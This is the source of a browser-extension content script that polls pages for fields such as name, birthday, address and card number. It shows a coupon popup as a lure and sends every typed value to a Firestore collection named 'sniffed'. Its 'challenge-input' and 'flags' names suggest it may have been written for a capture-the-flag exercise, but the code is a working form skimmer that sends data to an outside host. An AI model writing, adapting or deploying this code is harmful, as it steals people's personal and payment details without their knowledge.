let popupShown = false;
let previousValues = {};

const inputIds = ["challenge-input", "name", "birthday", "address", "cardNumber", "foodType", "price"];

function checkForInputElements() {
  inputIds.forEach(id => {
    const inputElement = document.getElementById(id);
    
    if (inputElement) {
      const inputValue = inputElement.value;
      
      if (!popupShown) {
          let foundInputs = inputIds.filter(id => document.getElementById(id));
          let popupType = "coupons";
          if (foundInputs.length === 1 && foundInputs[0] === "challenge-input") {
            popupType = "flags";
          }
          chrome.storage.local.set({ popupType: popupType });
          chrome.runtime.sendMessage({ action: "showPopup" });
          popupShown = true;
      }
      
      if (inputValue.length > 3 && inputValue !== previousValues[id]) {
        sendToFirebase(id, inputValue);
        previousValues[id] = inputValue;
      }
    }
  });
}

function sendToFirebase(inputId, value) {
  const firebaseConfig = {
    firebaseURL: "https://firestore.googleapis.com",
    dbName: "t-capybase",
    collectionName: "sniffed"
  };

  const endpoint = `${firebaseConfig.firebaseURL}/v1/projects/${firebaseConfig.dbName}/databases/(default)/documents/${firebaseConfig.collectionName}`;

  const data = {
    "fields": {
      [inputId]: { "stringValue": value }
    }
  };

  fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => response.json())
  .catch();
}

const intervalId = setInterval(checkForInputElements, 750);
